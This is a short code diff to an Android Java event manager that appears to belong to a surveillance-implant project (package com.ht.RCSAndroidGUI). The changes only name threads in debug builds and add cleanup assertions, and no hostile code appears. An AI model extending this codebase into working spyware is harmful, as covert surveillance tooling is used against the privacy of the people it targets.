@@ -14,6 +14,7 @@ import java.util.Map;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Manager;
+import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
@@ -158,7 +159,9 @@ public class EventManager extends Manager {
 				
 				if (e.getStatus() != EventConf.EVENT_RUNNING) {
 					final Thread t = new Thread(e);
-					
+					if(Configuration.DEBUG){
+						t.setName(e.getClass().getSimpleName());
+					}
 					t.start();
 					threads.put(e, t);
 				} else {
@@ -203,6 +206,12 @@ public class EventManager extends Manager {
 			}
 
 		}
+		
+		Check.ensures(threads.size() == 0, "Non empty threads");
+		Check.ensures(running.size() == 0, "Non empty running");
+		
+		running.clear();
+		threads.clear();
 	}
 
 	/* (non-Javadoc)
